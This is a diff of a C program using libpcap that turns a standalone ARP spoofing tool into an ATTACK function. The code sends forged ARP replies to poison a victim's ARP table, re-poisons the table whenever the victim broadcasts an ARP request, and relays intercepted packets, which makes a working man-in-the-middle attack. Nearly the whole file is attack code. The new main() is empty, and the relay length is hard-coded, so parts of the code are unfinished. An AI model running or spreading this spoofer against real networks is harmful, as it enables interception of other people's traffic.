@@ -11,6 +11,8 @@
 #include<stdint.h>
 #include<arpa/inet.h>
 #include<netinet/in.h>
+#include<pthread.h>
+
 
 typedef struct{
 	//ethernet header
@@ -50,7 +52,7 @@ void get_ip_address(u_int8_t *ip_address, u_int8_t *interface) {
 }
 
 
-int main(int argc, char *argv[])
+void ATTACK(char *device, char *send_ip, char *recv_ip)
 {
 	pcap_t *handle;				/* Session handle */
 	u_int8_t *dev;				/* The device to sniff on */
@@ -70,7 +72,7 @@ int main(int argc, char *argv[])
 
 
 	/* Define the device */
-	dev = argv[1];
+	dev = device;
 	if (dev == NULL) {
 		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
 		return(2);
@@ -85,8 +87,8 @@ int main(int argc, char *argv[])
 	}
 
 	/*set sender's and receiver's ip address*/	
-	inet_pton(AF_INET, argv[2], sender_ip);
-	inet_pton(AF_INET, argv[3], receiver_ip);
+	inet_pton(AF_INET, send_ip, sender_ip);
+	inet_pton(AF_INET, recv_ip, receiver_ip);
 
 	/*PART_1 : find attacker's ip and mac address*/
 	get_mac_address(attacker_mac, dev);
@@ -154,14 +156,18 @@ int main(int argc, char *argv[])
 	{
 		pcap_next_ex(handle, &header, &packet_get);
 		if( (packet_get[12] == 0x08) && (packet_get[13] == 0x06) && (packet_get[20] == 0x00) && (packet_get[21] == 0x02) && (packet_get[28] == receiver_ip[0]) &&
-		(packet_get[29] == receiver_ip[1]) && (packet_get[30] == receiver_ip[2]) && (packet_get[31] == receiver_ip[3]) ) 	break;
+		(packet_get[29] == receiver_ip[1]) && (packet_get[30] == receiver_ip[2]) && (packet_get[31] == receiver_ip[3]) ) break;
+		
+			 
 	}
 		
 	//get receiver's mac address
 	receiver_mac[0] = packet_get[22];receiver_mac[1] = packet_get[23];receiver_mac[2] = packet_get[24];receiver_mac[3] = packet_get[25];receiver_mac[4] = packet_get[26];receiver_mac[5] = packet_get[27];
 
+/*****************______________________ARP SPOOFING START___________________________*******************/
 
-/*************______________________ARP INFECTION START______________________________________*****************/
+
+	/*************______________________INITIAL ARP INFECTION START______________________________________*****************/
 
 
 	/*PART_6 : send fake arp reply packet to sender and change sender's arp table*/
@@ -187,38 +193,71 @@ int main(int argc, char *argv[])
 	pcap_sendpacket(handle, arp_packet, 42);
 	
 
-/*************______________________ARP INFECTION FINISH_____________________________________*****************/
+	/*************______________________INITIAL ARP INFECTION FINISH_____________________________________*****************/
 
 
-/*************______________________ARP REPLY START______________________________________*****************/
-	 while(1)
+
+
+ while(1)
         {
                 pcap_next_ex(handle, &header, &packet_get);
+
+		/*************______________________ARP REPLY START______________________________________*****************/
                 if( (packet_get[6]==sender_mac[0])&&(packet_get[7]==sender_mac[1])&&(packet_get[8]==sender_mac[2])&&(packet_get[9]==sender_mac[3])&&(packet_get[10]==sender_mac[4])&&
-		(packet_get[11]==sender_mac[5])&&(packet_get[30]==receiver_ip[0])&&(packet_get[31]==receiver_ip[1])&&(packet_get[32]==receiver_ip[2])&&(packet_get[33]==receiver_ip[3]) )
-		break;
+		(packet_get[11]==sender_mac[5])&&(packet_get[30]==receiver_ip[0])&&(packet_get[31]==receiver_ip[1])&&(packet_get[32]==receiver_ip[2])&&(packet_get[33]==receiver_ip[3]))
+		{
+			packet_relay = (ether_ip_header*)(packet_get);
+			pcap_sendpacket(handle, packet_relay,60);
+		}
+		/*************______________________ARP REPLY FINISH_____________________________________*****************/
+
+		/*************______________________RE ARP INFECTION START______________________________________*****************/
+		else if( (packet_get[12]==0x08) && (packet_get[13]==0x06) && (packet_get[0]==0xff) && (packet_get[1]==0xff) && (packet_get[2]==0xff) && (packet_get[3]==0xff) && 
+		(packet_get[4]==0xff) && (packet_get[5]==0xff) && (packet_get[38]==receiver_ip[0]) && (packet_get[39]==receiver_ip[1]) && (packet_get[40]==receiver_ip[2]) && 
+		(packet_get[41]==receiver_ip[3]) )
+		{
+			//ethernet header Destination : Unicast
+			arp_packet[0] = sender_mac[0];arp_packet[1] = sender_mac[1];arp_packet[2] = sender_mac[2];arp_packet[3] = sender_mac[3];arp_packet[4] = sender_mac[4];arp_packet[5] = sender_mac[5];
+			//ethernet header Source
+			arp_packet[6] = attacker_mac[0];arp_packet[7] = attacker_mac[1];arp_packet[8] = attacker_mac[2];arp_packet[9] = attacker_mac[3];arp_packet[10] = attacker_mac[4];arp_packet[11] = attacker_mac[5];
+			//ehternet header Type : arp
+			arp_packet[12] = 0x08; arp_packet[13] = 0x06;
+			//arp header basic setting
+			arp_packet[14] = 0x00;arp_packet[15] = 0x01;arp_packet[16] = 0x08;arp_packet[17] = 0x00;arp_packet[18] = 0x06;arp_packet[19] = 0x04;arp_packet[20] = 0x00;arp_packet[21] = 0x02; // fake reply
+			//arp header Source Hardware Address
+			arp_packet[22] = attacker_mac[0];arp_packet[23] = attacker_mac[1];arp_packet[24] = attacker_mac[2];arp_packet[25] = attacker_mac[3];arp_packet[26] = attacker_mac[4];arp_packet[27] = attacker_mac[5];		
+			//arp header Source Protocol Address
+			arp_packet[28] = receiver_ip[0];arp_packet[29] = receiver_ip[1];arp_packet[30] = receiver_ip[2];arp_packet[31] = receiver_ip[3]; // sender's ip address
+			//arp header Destination Hardware Address
+			arp_packet[32] = sender_mac[0]; arp_packet[33] = sender_mac[1]; arp_packet[34] = sender_mac[2]; arp_packet[35] = sender_mac[3]; arp_packet[36] = sender_mac[4]; arp_packet[37] = sender_mac[5];
+			//arp header Destination Protocol Address
+			arp_packet[38] = sender_ip[0];arp_packet[39] = sender_ip[1];arp_packet[40] = sender_ip[2];arp_packet[41] = sender_ip[3];
+
+
+			pcap_sendpacket(handle, arp_packet, 42);
+		}		
+		/*************______________________RE ARP INFECTION FINISH_____________________________________*****************/
 	}
-
-	packet_relay = (ether_ip_header*)(packet_get);
-	pcap_sendpacket(handle, packet_relay,60);
 	
 	
 
 
-
-/*************______________________ARP REPLY FINISH_____________________________________*****************/
+/*****************______________________ARP SPOOFING FINISH__________________________*******************/
 
 
 	/* And close the session */
 	pcap_close(handle);
-	return(0);
+	return;
+
+}
 
 
+void main(){
+	
 
- }
-
-
-
+	
+	
+}
 
 
 
